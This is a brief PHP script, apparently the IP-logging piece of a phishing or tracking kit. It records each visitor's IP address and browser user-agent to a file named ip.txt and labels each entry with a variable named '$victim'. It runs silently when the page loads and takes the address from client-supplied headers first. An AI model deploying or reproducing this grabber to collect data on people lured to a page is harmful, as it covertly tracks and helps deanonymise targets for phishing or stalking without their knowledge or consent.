<?php

$ipaddress = '';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

$file = 'ip.txt';
$victim = "IP: ";

$fp = fopen($file, 'a');

fwrite($fp, $victim . $ipaddress . "\r\n");
fwrite($fp, $useragent . $browser . "\r\n");

fclose($fp);
